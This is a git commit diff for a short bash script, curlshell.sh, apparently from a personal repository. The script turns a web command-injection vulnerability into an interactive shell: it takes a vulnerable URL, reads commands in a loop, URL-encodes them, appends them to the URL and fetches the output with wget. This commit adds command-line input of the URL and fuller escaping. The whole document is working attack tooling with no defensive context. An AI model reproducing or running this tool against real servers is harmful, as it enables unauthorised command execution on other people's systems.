0e2369e00a0222db957cbf4c327d4193a4fe23f6
kernelzeroday <enktal@gmail.com>
2016-01-06 23:37:06 -0500

    updates

--- curlshell.sh
+++ curlshell.sh
@@ -1,12 +1,18 @@
 #!/bin/bash
+if [ -z $1 ] 
+then 
 echo -n "enter vuln url: "
 read a
+else
+a=$1
+fi
 while true 
 echo -n "$ "
 do read i
 e=$(sed 's/\ /\%20/g' <<<$i)
 b=$(sed 's/\;/\%3B/g' <<<$e)
 f=$a$b
-echo "* --> * --> " $f " <-- * <-- *"
-wget -qO - $f
+#echo "* --> * --> " $f " <-- * <-- *"
+z=$(perl -MURI::Escape -e 'print uri_escape shift, , q{^A-Za-z0-9\-._~/:}' -- $f)
+wget -qO - $z
 done
